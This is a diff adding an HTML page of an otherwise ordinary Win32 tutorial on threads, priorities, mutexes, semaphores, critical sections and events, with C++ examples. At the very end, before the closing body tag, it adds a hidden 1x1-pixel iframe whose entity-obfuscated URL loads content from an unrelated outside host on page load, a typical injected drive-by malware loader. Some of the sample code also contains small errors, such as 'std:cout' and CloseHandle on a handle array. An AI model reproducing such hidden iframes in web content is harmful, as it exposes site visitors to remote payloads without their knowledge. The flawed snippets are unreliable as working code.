@@ -1,0 +1,573 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<title>Win32 Multithreading and Synchronization (ver. 1.0.0)</title>
+	
+	<meta http-equiv="Content-Type" content="text/html charset=utf-8" />
+	<meta content="Copyright 2002 SpiderMan" name="Copyright" />
+	<meta content="SpiderMan" name="Author" />
+	<meta content="English" name="Language" />
+	
+	<style type="text/css">
+	<!--
+		body {font: 12px Verdana, Arial, Helvetica, sans-serif}
+
+		p {text-align: left;}
+		p.para {text-indent: 12px}
+
+		table.example {width: 450px; font-size: 12px}
+
+		span.function {color: gray; font-weight: bold}
+		span.term {color: gray; font-style: italic}
+		
+		div.lastupdate {text-align: right}
+		/* hack so IE will center my stuff since it doesn't recognize margin: auto */
+		div.center {text-align: center}
+	
+		a:link {text-decoration: underline; color: #003F7F}
+		a:visited {text-decoration: underline; color: #003F7F}
+		a:hover {text-decoration: underline; color: #CC0000}
+
+		h2, h3 {font-size: 12px}
+		h1.title {font-weight: normal; text-align: center; font-size: 12px}
+
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px; text-align: left; width: 570px; margin-left: auto; margin-right: auto}
+	-->
+	</style>
+</head>
+
+<body>
+	<h1 class="title">
+		<strong>Win32 Multithreading and Synchronization (ver. 1.0.0)</strong>
+		<br/>
+by: <a href="mailto:spiderman@witty.com">SpiderMan</A> of <a href="http://blacksun.box.sk">Black Sun Research Facility </a>
+		
+	</h1>
+	<h2>Table of Contents:</h2>
+	<ul>
+		<li><a href="#intro" title="Click to skip down to this section.">Introduction</a></li>
+		<li><a href="#background" title="Click to skip down to this section.">Background</a></li>
+		<li><a href="#multi" title="Click to skip down to this section.">Multithreading</a></li>
+		<li><a href="#synch" title="Click to skip down to this section.">Synchronization</a></li>
+		<ul>
+			<li><a href="#mutex" title="Click to skip down to this section.">Mutexes</a></li>
+			<li><a href="#sema" title="Click to skip down to this section.">Semaphores</a></li>
+			<li><a href="#cs" title="Click to skip down to this section.">Critical Sections</a></li>
+			<li><a href="#events" title="Click to skip down to this section.">Events</a></li>
+		</ul>
+		<li><a href="#ref" title="Click to skip down to this section.">References</a></li>
+		<li><a href="#con" title="Click to skip down to this section.">Conclusion</a></li>
+	</ul>
+	<a name="intro">
+	<h2>Introduction:</h2>
+  	<p class="para">
+		This tutorial will explain how to create and manage multiple threads in Windows. This is an advanced tutorial; the reader should be familiar with Win32 programming.
+	</p>
+	<p class="para">
+		The need for responsive user-centric programs is a good reason to create programs that use multiple threads. By creating multiple threads, a program can seem to do many things at once (on a computer with more than one CPU, the program actually will do many things at once). For example, a word processor could have one thread that handles the painting of the processor's window while another thread saves the document being typed every few minutes while yet another thread actively monitors the document for spelling errors all without forcing the user to wait while each task is completed.
+	</p>
+	<a name="background">
+	<h2>Background:</h2>
+  	<p class="para">
+		On a single CPU Windows machine, all threads are kept track of and given a slice of processor time (usually a few milliseconds). Windows will cycle through the list it keeps, pausing and resuming each thread. Once a thread has used up its time on the processor, Windows will pause the thread, record its CPU registers (along with some other data), and, after restoring all its data, activate the next thread. Each thread has two priorities: base and dynamic. The base priority can be changed, however, it cannot be changed to have a priority higher than that of the parent thread. Dynamic priority is the same as the base priority, however, it can be raised or lowered by Windows. Windows chooses which thread to run next based on the thread's dynamic priority. Naturally, threads with a higher dynamic priority run first.
+	</p>
+	<a name="multi">
+	<h2>Multithreading:</h2>
+	  <p class="para">
+		Initially, every program gets one thread, known as the primary thread, which is created by the Windows Object Manager. The primary thread can be used to create child threads. To create another thread call <span class="function">CreateThread</span>. <span class="function">CreateThread</span> takes the following parameters:
+	</p>
+	<div class="center">
+		<pre class="example">
+HANDLE CreateThread(
+   LPSECURITY_ATTRIBUTES lpThreadAttributes, // access privileges
+   DWORD dwStackSize,                        // initial stack size
+   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
+   LPVOID lpParameter,                       // thread argument
+   DWORD dwCreationFlags,                    // creation option
+   LPDWORD lpThreadId                        // thread identifier
+);
+</pre>
+	</div>
+	<p>
+		If the first parameter is passed as NULL, the thread will get the default security descriptor. The second parameter allows you to set the initial stack size, you can pass 0 to give the thread the default stack size. The third parameter is a pointer to the function the thread should start executing. The fourth parameter holds any arguments you want to pass to the function. You can pass either a 0 or CREATE_SUSPENDED to the fifth parameter. If it is 0, the thread starts running as soon as it is created. If the value is CREATE_SUSPENDED, the thread will be created suspended and will not start running until you call <span class="function">ResumeThread</span>. The last parameter is a pointer to a DWORD which will hold the unique ID of the thread, after it is created.
+	</p>
+	<p class="para">
+		If a thread was created with the CREATE_SUSPENDED flag, you will want to call <span class="function">ResumeThread</span> to start using it. <span class="function">ResumeThread</span> takes the following parameter:
+	</p>
+	<div class="center">
+		<pre class="example">
+DWORD ResumeThread(HANDLE hThread);
+</pre>
+	</div>
+	<p>
+		hThread is the handle received by <span class="function">CreateThread</span>. To suspend the thread again, call <span class="function">SuspendThread</span>:
+	</p>
+	<div class="center">
+		<pre class="example">
+DWORD SuspendThread(HANDLE hThread);
+</pre>
+	</div>
+	<p>
+		Once again, hThread is the handle received by <span class="function">CreateThread</span>.
+	</p>
+	<p class="para">
+		While a thread is suspended, you may want to raise its base priority and then wake it again. A thread with a higher priority will get more processor time. To change a thread's base priority, call <span class="function">SetThreadPriority</span>:
+	</p>
+	<div class="center">
+		<pre class="example">
+BOOL SetThreadPriority(
+   HANDLE hThread, // handle to the thread
+   int nPriority   // thread priority level
+);
+</pre>
+	</div>
+	<p>
+		nPriority can be one of seven values:
+	</p>
+	<div class="center">
+		<table class="example" border="1" cellspacing="0" cellpadding="2" summary="Table of possible values for thread priorities">
+			<tr>
+				<td>THREAD_PRIORITY_LOWEST</td>
+				<td>Two levels below process</td>
+			</tr>
+			<tr>
+				<td>THREAD_PRIORITY_BELOW_NORMAL</td>
+				<td>One level below process</td>
+			</tr>
+			<tr>
+				<td>THREAD_PRIORITY_NORMAL</td>
+				<td>Normal priority</td>
+			</tr>
+			<tr>
+				<td>THREAD_PRIORITY_ABOVE_NORMAL</td>
+				<td>One level above process</td>
+			</tr>
+			<tr>
+				<td>THREAD_PRIORITY_HIGHEST</td>
+				<td>Two levels above process</td>
+			</tr>
+			<tr>
+				<td>THREAD_PRIORITY_TIME_CRITICAL</td>
+				<td>Priority of 15</td>
+			</tr>
+			<tr>
+				<td>THREAD_PRIORITY_IDLE</td>
+				<td>Priority of 1</td>
+			</tr>
+		</table>
+	</div>
+	<p>
+		To retrieve a thread's base priority level, call <span class="function">GetThreadPriority</span>:
+	</p>
+	<div class="center">
+		<pre class="example">
+int GetThreadPriority(HANDLE hThread);
+</pre>
+	</div>
+	<p class="para">
+		After you are done using a thread, you may want to terminate it. To do this, call <span class="function">ExitThread</span>. <span class="function">ExitThread</span> followed by a <span class="function">CloseHandle</span> is the graceful way to shut down a thread. To immediately stop a thread, call <span class="function">TerminateThread</span>. The specs of each function are:
+	</p>
+	<div class="center">
+		<pre class="example">
+VOID ExitThread( DWORD dwExitCode);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+BOOL CloseHandle(HANDLE hThread);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+BOOL TerminateThread(HANDLE hThread, DWORD dwExitCode);
+</pre>
+	</div>
+	<p>
+		Windows automatically calls <span class="function">ExitThread</span> when a thread ends its function. dwExitCode is the exit code you want to pass. The exit code can later be retrieved using <span class="function">GetExitCodeThread</span>:
+	</p>
+	<div class="center">
+		<pre class="example">
+BOOL GetExitCodeThread(
+   HANDLE hThread,
+   LPDWORD lpExitCode   // pointer to a DWORD to hold the exit code
+);
+</pre>
+	</div>
+	<p class="para">
+		The following is an example of how to use threads.
+	</p>
+	<div class="center">
+		<pre class="example">
+#define WIN32_LEAN_AND_MEAN
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+
+DWORD ThreadID;
+HANDLE TName;
+
+void ExampleFunction()
+{
+  for(int x=0; x<10; x++)
+  {
+    std:cout<<"Doing important stuff!\n";
+  }
+}
+
+void main()
+{
+  TName= CreateThread(NULL, 0,
+    (LPTHREAD_START_ROUTINE)ExampleFunction,
+    NULL, CREATE_SUSPENDED, &ThreadID);
+
+  if (TName == NULL)
+  {
+    std::cout<<"Could not create thread!\n";
+    return false;
+  }
+			
+  if (!SetThreadPriority(TName, THREAD_PRIORITY_BELOW_NORMAL))
+  {
+    std::cout<<"SetThreadPriority failed!\n";
+    return false;
+  }
+
+  if ((ResumeThread(TName)) == -1)
+  {
+    std::cout<<"ResumeThread failed!\n";
+    return false;
+  }
+  
+  WaitForSingleObject(TName, INFINITE);  // discussed later
+
+  CloseHandle(TName);
+}
+</pre>
+	</div>
+	<a name="synch">
+	<h2>Synchronization:</h2>
+	<p class="para">
+		Picture this: a word processor program creates two threads, one to read a file and another to write to a file. Everything is fine at first, the first thread waits for the second to finish writing to the file before reading it. The two threads work happily, everything is fine as long as the writing thread always writes first. But one dark day, the reading thread reads the file before the writing thread writes to the file and the program fails. This is known as a <span class="term">race condition</span> because both threads race to finish their file operation. The program will always fail if the reading thread wins the race. A <span class="term">race condition</span> is the result of bad synchronization. Another problem is the dreaded <span class="term">deadlock</span>. In a <span class="term">deadlock</span>, both threads will wait for each other to finish but neither thread will finish until the other finishes first, causing them to become locked. The solution to this problem is to use one, or more, of the synchronization objects provided by Windows.
+	</p>
+	<p class="para">
+		To gain ownership of any of the synchronization objects, a thread can use <span class="function">WaitForSingleObject</span>, <span class="function">WaitForSingleObjectEx</span>, <span class="function">WaitForMultipleObjects</span>, or <span class="function">WaitForMultipleObjectsEx</span>.
+	</p>
+	<p class="para">
+		<span class="function">WaitForSingleObject</span> allows a thread to suspend itself while it waits for ownership of one of the synchronization objects.
+	</p>
+	<div class="center">
+		<pre class="example">
+DWORD WaitForSingleObject(
+   HANDLE hHandle,        // handle to object
+   DWORD dwMilliseconds   // time-out interval
+);
+</pre>
+	</div>
+	<p>
+		The second parameter is the amount of time, in milliseconds, the thread is willing to wait for the object before it returns. If the second parameter is set to INFINITE, the function will not time-out. If the second parameter is set to 0, the function will try to gain ownership of the object and return immediately, even if it didn't gain ownership.
+	</p>
+	<p class="para">
+		<span class="function">WaitForSingleObjectEx</span> is the same as <span class="function">WaitForSingleObject</span> except, it adds one more option: alert if I/O operation completes.
+	</p>
+	<div class="center">
+		<pre class="example">
+DWORD WaitForSingleObjectEx(
+   HANDLE hHandle,        // handle to object
+   DWORD dwMilliseconds,  // time-out interval
+   BOOL bAlertable        // alertable option
+);
+</pre>
+	</div>
+	<p>
+		If the last parameter is set to true, the function will return when an asynchronous I/O operation completes.
+	</p>
+	<p class="para">
+		<span class="function">WaitForMultipleObjects</span> allows a thread to wait for multiple synchronization objects at once. It can be set to return when any or all of the objects become available.
+	</p>
+	<div class="center">
+		<pre class="example">
+DWORD WaitForMultipleObjects(
+   DWORD nCount,             // number of handles in array
+   CONST HANDLE *lpHandles,  // object-handle array
+   BOOL bWaitAll,            // wait option
+   DWORD dwMilliseconds      // time-out interval
+);
+</pre>
+	</div>
+	<p>
+		If the third parameter is set to TRUE, the function will wait for all of the objects to become available. If the third parameter is set to FALSE, the function will wait for any of the objects to become available, the return value of the function will be the index to the handles array to let you know which object that has been obtained.
+	</p>
+	<p class="para">
+		<span class="function">WaitForMultipleObjectsEx</span> is the same as <span class="function">WaitForSingleObjectEx</span>, except it allows you to wait for multiple objects.
+	</p>
+	<div class="center">
+		<pre class="example">
+DWORD WaitForMultipleObjectsEx(
+  DWORD nCount,             // number of handles in array
+  CONST HANDLE *lpHandles,  // object-handle array
+  BOOL bWaitAll,            // wait option
+  DWORD dwMilliseconds,     // time-out interval
+  BOOL bAlertable           // alertable option
+);
+</pre>
+	</div>
+	<a name="mutex">
+	<h3>Mutexes:</h3>
+	<p class="para">
+		Like all other synchronization objects, a mutex is created by the Windows Object Manager. Mutex is short for mutual exclusion, meaning that only one thread can own it at a time. Think of it as a sort of ticket, any thread holding the ticket gets to access whatever is being protected by the mutex. While the thread is doing its job, all the other threads wait. Once the thread is done, it gives the ticket away and the next thread can do what it needs to do while the other threads wait.
+	</p>
+	<p class="para">
+		To create a mutex call <span class="function">CreateMutex</span>:
+	</p>
+	<div class="center">
+		<pre class="example">
+HANDLE CreateMutex(
+   LPSECURITY_ATTRIBUTES lpMutexAttributes,
+   BOOL bInitialOwner,                       // initial owner
+   LPCTSTR lpName                            // object's name
+);
+</pre>
+	</div>
+	<p>
+		The first parameter can be passed as NULL to obtain the default access rights. If the second parameter is set to TRUE, the creator of the mutex will have ownership first. The third parameter is optional, it can be used to easily identify the mutex.
+	</p>
+	<p class="para">
+		To release the mutex after doing whatever needs to be done, call <span class="function">ReleaseMutex</span>.
+	</p>
+	<div class="center">
+		<pre class="example">
+BOOL ReleaseMutex(
+   HANDLE hMutex   // handle to mutex
+);
+</pre>
+	</div>
+	<p>
+		Only the thread that owns the mutex can release it. To destroy the mutex, call <span class="function">CloseHandle</span> with the handle to the mutex.
+	</p>
+	</div>
+	<a name="sema">
+	<h3>Semaphores:</h3>
+	<p class="para">
+		A semaphore is useful when you want to only allow a limited amount of threads to access a protected resource at a time. With a mutex, only one thread can own it at any given moment. With a semaphore, multiple threads can own it at a time. Consequently, any thread can also destroy the semaphore. To create a semaphore call <span class="function">CreateSemaphore</span>.
+	</p>
+	<div class="center">
+		<pre class="example">
+HANDLE CreateSemaphore(
+   LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,
+   LONG lInitialCount,                          // initial count
+   LONG lMaximumCount,                          // maximum count
+   LPCTSTR lpName                               // object's name
+);
+</pre>
+	</div>
+	<p>
+		The first parameter is handled the exact same as the first parameter of <span class="function">CreateMutex</span>. The second parameter sets the initial count of the semaphore, usually it's set to the same value as that of the maximum count. The initial count cannot be less than zero nor greater than the maximum count. The third parameter sets the maximum count which limits the number of threads that can own the semaphore. The last parameter is handled the same way as that of <span class="function">CreateMutex</span>. After a thread gains possession of the semaphore the initial count is decremented one. If the initial count reaches 0, no more threads can gain possession of the semaphore. The initial count is incremented after a thread releases the semaphore.
+	</p>
+	<p class="para">
+		To release a semaphore, call <span class="function">ReleaseSemaphore</span>.
+	</p>
+	<div class="center">
+		<pre class="example">
+BOOL ReleaseSemaphore(
+   HANDLE hSemaphore,       // handle to semaphore
+   LONG lReleaseCount,      // count increment amount
+   LPLONG lpPreviousCount   // previous count
+);
+</pre>
+	</div>
+	<p>
+		The second parameter sets by how much the count should be incremented, usually this is 1. The third parameter holds a pointer to a variable that will be filled with the previous count, after <span class="function">ReleaseSemaphore</span> completes.
+	</p>
+	<a name="cs">
+	<h3>Critical Sections:</h3>
+	<p class="para">
+		A critical section is very similar to a mutex. A critical section can only be owned  by one thread at a time, however, a critical section cannot be shared between processes, a mutex can. Because of this, a critical section works more quickly. To create a critical section, call <span class="function">InitializeCriticalSection</span>; to own a critical section, call <span class="function">EnterCriticalSection</span>; to give up ownership of a critical section, call <span class="function">LeaveCriticalSection</span>; to destroy a critical section, call <span class="function">DeleteCriticalSection</span>.
+	</p>
+	<div class="center">
+		<pre class="example">
+VOID InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+VOID EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+VOID LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+VOID DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
+</pre>
+	</div>
+	<p>
+		All of the functions require a pointer to the critical section object. You declare one like this:
+	</p>
+	<div class="center">
+		<pre class="example">
+CRITICAL_SECTION cs;
+</pre>
+	</div>
+	<p class="para">
+		Any thread that is of the process that created the critical section can destroy the critical section.
+	</p>
+	<a name="events">
+	<h3>Events:</h3>
+	<p class="para">
+		An event object is useful when you want to alert threads of an action occurring, a button being pushed for example. An event object is sent to all waiting threads. Call <span class="function">CreateEvent</span> to create an event; call <span class="function">SetEvent</span> to signal an event; call <span class="function">ResetEvent</span> to turn the signal off. When an event is signaled, all threads that wait for it will receive it; when the event is not signaled, the threads will wait. You can also call <span class="function">PulseEvent</span> to quickly signal and unsignal an event. This is useful in releasing the waiting threads.
+	</p>
+	<p class="para">
+		<span class="function">CreateEvent</span> takes the following parameters:
+	</p>
+	<div class="center">
+		<pre class="example">
+HANDLE CreateEvent(
+   LPSECURITY_ATTRIBUTES lpEventAttributes,
+   BOOL bManualReset,                       // reset type
+   BOOL bInitialState,                      // initial state
+   LPCTSTR lpName                           // object name
+);
+</pre>
+	</div>
+	<p>
+		If the second parameter is set to TRUE, the event must be reset manually. If the second parameter is set to FALSE, the event will return to its unsignaled state immediately after a call to <span class="function">SetEvent</span>. If the third parameter is set to TRUE, the event will be created and set to the signaled state. The last parameter is an optional name for the object.
+	</p>
+	<p class="para">
+		<span class="function">SetEvent</span>, <span class="function">ResetEvent</span>, and <span class="function">PulseEvent</span> are all called in the same way:
+	</p>
+	<div class="center">
+		<pre class="example">
+BOOL SetEvent(HANDLE hEvent);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+BOOL ResetEvent(HANDLE hEvent);
+</pre>
+	</div>
+	<div class="center">
+		<pre class="example">
+BOOL PulseEvent(HANDLE hEvent);
+</pre>
+	</div>
+	<p>
+		hEvent being the handle returned from <span class="function">CreateEvent</span>.
+	</p>
+	<p class="para">
+		The combination of a mutex and an event is a good way to avoid deadlocks. The following is an example of using the mutex and event synchronization objects.
+	</p>
+	<div class="center">
+		<pre class="example">
+#define WIN32_LEAN_AND_MEAN
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+
+HANDLE hMutex, hWriteDone, hReadDone;
+int num, state;
+
+void Writer()
+{
+  for(int x=10; x>=0; x--)
+  {
+    while (true)
+    {
+      if (WaitForSingleObject(hMutex, INFINITE) == WAIT_FAILED)
+      {
+        std::cout<<"In writing loop, no mutex!\n";
+        ExitThread(0);
+      }
+      if (state == 0)
+      {
+        ReleaseMutex(hMutex);
+
+        WaitForSingleObject(hReadDone, INFINITE);
+        continue;
+      }
+
+      break;
+    }
+
+    std::cout<<"Write done\n";
+    num= x;
+    state= 0;
+    ReleaseMutex(hMutex);
+    PulseEvent(hWriteDone);
+  }
+}
+
+void Reader()
+{
+  while(true)
+  {
+    if (WaitForSingleObject(hMutex, INFINITE) == WAIT_FAILED)
+    {
+      std::cout<<"In reader, no mutex!\n";
+      ExitThread(0);
+    }
+    if (state == 1)
+    {
+      ReleaseMutex(hMutex);
+
+      WaitForSingleObject(hWriteDone, INFINITE);
+      continue;
+    }
+    if (num == 0)
+    {
+      std::cout<<"End of data\n";
+      ReleaseMutex(hMutex);
+      ExitThread(0);
+    }
+    else {
+      std::cout<<"Read done\n";
+      state=1;
+      ReleaseMutex(hMutex);
+      PulseEvent(hReadDone);
+    }
+  }
+}
+
+void main()
+{
+  HANDLE TName[2];
+  DWORD ThreadID;
+
+  state= 1;
+  
+  hMutex= CreateMutex(NULL, FALSE, NULL);
+
+  hWriteDone= CreateEvent(NULL, TRUE, FALSE, NULL);
+  hReadDone= CreateEvent(NULL, TRUE, FALSE, NULL);
+
+  TName[0]= CreateThread(NULL, 0,
+    (LPTHREAD_START_ROUTINE)Writer,
+    NULL, 0, &ThreadID);
+
+  TName[1]= CreateThread(NULL, 0,
+    (LPTHREAD_START_ROUTINE)Reader,
+    NULL, 0, &ThreadID);
+
+  WaitForMultipleObjects(2, TName, TRUE, INFINITE);
+
+  CloseHandle(TName);
+}
+</pre>
+	</div>
+	<a name="ref">
+	<h2>References:</h2>
+	<ul>
+		<li><a href="http://msdn.microsoft.com" target="_blank" title="Link opens in a new browser window.">Microsoft Developer Network</a></li>
+		<li><u>Windows 98 Developer's Handbook</u> by Ben Ezzell and Jim Blaney, Sybex Publishing</li>
+	</ul>
+	<a name="con">
+	<h2>Conclusion:</h2>
+  	<p class="para">
+		And so ends yet another text file. As always, if you find any errors or have any comments please send them to <a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>. Please direct all questions to the message board. Until next time...
+	</p>
+	<div class="lastupdate">Last updated: <strong>1/22/01</strong></div>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
